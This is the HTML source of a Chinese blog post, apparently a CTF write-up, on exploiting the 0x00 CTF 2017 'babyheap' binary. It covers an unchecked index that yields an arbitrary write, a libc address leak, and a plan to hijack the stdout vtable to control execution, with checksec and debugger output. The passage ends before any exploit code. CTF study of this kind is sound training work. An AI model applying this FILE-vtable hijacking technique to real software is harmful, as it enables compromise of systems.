@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <meta name="baidu-site-verification" content="RC70b8mZ9A" />
+    <meta name="msvalidate.01" content="325714A6172A8D425D843D8163893A54" />
+    <meta name="google-site-verification" content="QAmqP2zEYaSBqoZ9w1x5RdOflLW2Fir2-yVs5LTIUxA" />
+    <meta name="google-site-verification" content="QgUuEnRKG0PKdnDrOxnq55x7VxQbCiprrMJpfakMlow" />
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.0 -->
+    <script>
+        window.materialVersion = "1.5.0"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1'
+        ]
+    </script>
+
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info"/>
+
+
+
+        <link rel="dns-prefetch" href="https://cdn-city.livere.com"/>
+
+
+
+
+
+
+
+
+
+
+    <!-- Title -->
+    
+    <title>
+        
+            Pwn with File结构体之利用 vtable 进行 ROP | 
+        
+        穷则变，变则通，通则久
+    </title>
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="theme-color" content="#0097A7">
+    <meta name="author" content="hac425">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content=",ctf">
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/girl.png">
+    <link rel="icon" sizes="192x192" href="/img/girl.png">
+    <link rel="apple-touch-icon" href="/img/girl.png">
+
+    <!--iOS -->
+    <meta name="apple-mobile-web-app-title" content="Title">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="480">
+
+    <!-- Add to homescreen for Chrome on Android -->
+    <meta name="mobile-web-app-capable" content="yes">
+
+    <!-- Add to homescreen for Safari on iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="穷则变，变则通，通则久">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icon -->
+
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?ezyEvm8ST5CGfpA+kFFi1g==", true)</script>
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://blog.hac425.top">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="Pwn with File结构体之利用 vtable 进行 ROP | 穷则变，变则通，通则久">
+    <meta property="og:image" content="http://blog.hac425.top/img/girl.png" />
+    <meta property="og:description" content="">
+    <meta property="og:article:tag" content="ctf"> 
+
+    
+        <meta property="article:published_time" content="Mon Apr 30 2018 13:58:00 GMT+0800" />
+        <meta property="article:modified_time" content="Tue May 08 2018 14:23:27 GMT+0800" />
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:title" content="Pwn with File结构体之利用 vtable 进行 ROP | 穷则变，变则通，通则久">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="http://blog.hac425.top/img/girl.png">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="http://blog.hac425.top" />
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://blog.hac425.top/2018/04/30/pwn_with_file_rop_by_vtable.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://blog.hac425.top/2018/04/30/pwn_with_file_rop_by_vtable.html",
+    "headline": "Pwn with File结构体之利用 vtable 进行 ROP",
+    "datePublished": "Mon Apr 30 2018 13:58:00 GMT+0800",
+    "dateModified": "Tue May 08 2018 14:23:27 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "hac425",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/girl.png"
+        },
+        "description": "纵横捭阖，冷心为上"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "穷则变，变则通，通则久",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/girl.png"
+        }
+    },
+    "keywords": ",ctf",
+    "description": "",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+        <script>
+    var _hmt = _hmt || [];
+    (function() {var hm = document.createElement('script');
+    hm.src = 'https://hm.baidu.com/hm.js?99747687c69d73d9102f032f78f03e96';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#控制rip"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">控制rip</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#getshell"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">getshell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路分析"><span class="post-toc-number">3.2.1.</span> <span class="post-toc-text">思路分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp分析"><span class="post-toc-number">3.2.2.</span> <span class="post-toc-text">exp分析</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">4.</span> <span class="post-toc-text">总结</span></a></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                Pwn with File结构体之利用 vtable 进行 ROP
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>hac425</strong>
+        <span>4月 30, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAAC1UlEQVR42u3ay24bQQwEQP//TyfXAIaCZnMTSzO1J0GSNay50Hx8/bry+cLGxsbGxsbGxsZ+S/ZX/Pz5/e9/++rT76+/nx4F/eLcJGZsbGzsG9jTI1+xk/fL9BNc4t/PwsbGxr6BnSStPJ1015RcWRkzNjY2NnbwnU3q2hQ82NjY2NibBJawp7+fnIWNjY2NvWrQxGlsWmZMG0z/qZeGjY2N/fbszaD3p17/8HwbGxsb+23Yzw5ck+OnCz2b8TA2Njb2DeykEZ8PaPOBblJa5Kuc0enY2NjYh7KnbZquONm09ZPUGKVMbGxs7MvY0wZTcll5GpuWMVEk2NjY2IeyNwckRya/3DWSxpFgY2NjH81O0timqOgSWNf2Kntp2NjY2B/LHjfZq0HvZh2zWyrCxsbGvo1dpoSgzZSPh7tPB60obGxs7KPZg3Fp3AzaLOjkKTN/sLGxsU9l79dloiOHI4TpOw+PB7CxsbE/ij1NHsk7SYLMy56nrgAbGxv7TnYX3LS1NL2mZMCMjY2NfQ87D3faNurSUj6EyC8dGxsb+2z29OAO0C3udOOHl1FhY2NjH8pO/tFPWv/7KxszhgNgbGxs7BvYXbLZFwmD0BfrO9jY2Nhns5NAp8ksKW82g4F8YICNjY19D3taSHRJaz8kKIsZbGxs7EPZOaBr/WwSXrKUs9pUwsbGxj6IvUlRXWnRtZmmF4SNjY19A3uaorohbhdoF9UDUxFsbGzsj2Inw9QOMwVPC4/8urGxsbFvY3eJpCtX9us+eXmDjY2NfSq7Sw/TBZou9G5Np1zZwcbGxv5w9lPFST6O7QYADycwbGxs7OPY00Z/UjB065UPjHXzBIaNjY19GXs/Bkiub1OWYGNjY2NP2/RdmZGknHwxKFnowcbGxr6BnQe0Gev+iwEwNjY2NnY36O0Gw8mlTEudqEzCxsbGPpR9z4ONjY2NjY2NjY39Ns9v6VFJSxNWPpMAAAAASUVORK5CYII=">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/ctf/">ctf</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Pwn with File结构体之利用 vtable 进行 ROP&url=http://blog.hac425.top/2018/04/30/pwn_with_file_rop_by_vtable.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Pwn with File结构体之利用 vtable 进行 ROP&url=http://blog.hac425.top/2018/04/30/pwn_with_file_rop_by_vtable.html&via=hac425" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2018/04/30/pwn_with_file_rop_by_vtable.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2018/04/30/pwn_with_file_rop_by_vtable.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文以  <code>0x00 CTF 2017</code> 的 <code>babyheap</code> 为例介绍下通过修改 <code>vtable</code> 进行 <code>rop</code> 的操作 (:-_-</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先查看一下程序开启的安全措施</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">18:07 haclh@ubuntu:0x00ctf $ checksec ./babyheap</div><div class="line">[*] &apos;/home/haclh/workplace/0x00ctf/babyheap&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Full RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div></pre></td></tr></table></figure>
+<p>没开 <code>PIE</code> 。</p>
+<p>接下来看看程序</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135126-8572abf0-4c3a-1.png" alt="image.png"></p>
+<p>对程序功能做个介绍</p>
+<ul>
+<li>程序一开始需要用户往 <code>bss</code> 段的 <code>name</code> 缓冲区输入内容</li>
+<li><code>add</code>  函数: 增加一个 <code>user</code>, 其实就是根据需要的大小使用 <code>malloc</code> 分配内存， 然后读入 <code>username</code>.</li>
+<li><code>edit</code> 函数: 根据输入的 <code>index</code> ， 取出指针， 往里面写入内容。 <strong><code>index</code> 没有校验</strong>。</li>
+<li><code>ban</code> 函数:  <code>free</code> 掉一个 <code>user</code>.</li>
+<li><code>changename</code> 函数: 修改 <code>bss</code> 段的 <code>name</code></li>
+</ul>
+<ul>
+<li>输入为 <code>5</code> 时， 会打印 <code>read</code> 函数的地址， 这样就可以拿到 <code>libc</code> 的基地址了。</li>
+</ul>
+<p>来看看 <code>edit</code> 函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135136-8b300ad8-4c3a-1.png" alt="image.png"></p>
+<p>直接使用我们输入的数字作为数组索引，在  <code>users</code> 数组中取到 <code>obj</code> 指针，然后使用 <code>strlen</code> 获取输入的长度，最后调用 <code>read</code> 往 <code>obj</code> 里面写内容。</p>
+<p>如果我们输入的数字大于 <code>users</code> 数组的长度就可以读取  <code>users</code> 数组 外面的数据作为 <code>read</code> 读取数据的指针了。</p>
+<p>下面来看看 <code>bss</code> 段的布局</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135145-90f64eb4-4c3a-1.png" alt="image.png"></p>
+<p>我们可以看到 <code>users</code> 后面就是 <code>name</code> 缓冲区， <code>name</code> 的内容我们可控， 于是利用 <code>edit</code> 函数里面的 <strong>越界读</strong> 漏洞，我们就可以伪造 <code>obj</code> 指针， 然后在 通过  <code>read</code> 读取数据时 就可以往 <code>obj</code> 指针处写东西， <strong>任意地址写</strong></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="控制rip"><a href="#控制rip" class="headerlink" title="控制rip"></a>控制rip</h2><p>整理一下现在拥有的能力。</p>
+<ul>
+<li>通过 <strong>选项5</strong> 可以 <code>leak</code> 出 <code>libc</code> 的地址</li>
+<li>通过 <code>edit</code> 和 <code>changename</code> 可以实现任意地址写</li>
+</ul>
+<p>题目给的 <code>libc</code> 是 <code>2.23</code>，没有虚表保护，于是选择改 <code>stdout</code> 的虚表指针，这样我们就可以伪造 <code>stdout</code> 的虚表，然后在调用虚表的时候，就可以控制 <code>rip</code> 了。</p>
+<p>我们知道  <code>stdout</code>  是 <code>_IO_FILE_plus</code> 类型，大小为 <code>0xe0</code> ， 最后 <code>8</code> 个字节是 <code>vtable</code> （即 <code>stdout+0xd8</code> 处）， 类型是<code>struct  _IO_jump_t</code> 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; p/x sizeof(struct _IO_FILE_plus )</div><div class="line">$8 = 0xe0</div><div class="line">pwndbg&gt; p ((struct _IO_FILE_plus*)stdout)-&gt;vtable </div><div class="line">$9 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</div><div class="line">pwndbg&gt; p/x sizeof(struct _IO_jump_t )</div><div class="line">$10 = 0xa8</div><div class="line">pwndbg&gt;</div></pre></td></tr></table></figure>
+<p>我们不能 <code>leak</code> 堆的地址，伪造虚表只能在 <code>name</code> 缓冲区内伪造，<code>name</code> 缓冲区的大小为 <code>0x28</code> , 而 虚表（<code>struct _IO_jump_t</code>）的大小 为 <code>0xa8</code>  ， 所以是不能伪造整个虚表的， 不过我们只需要把虚表中接下来会被调用的项的指针改了就行了 。有点绕，直接调试看。</p>
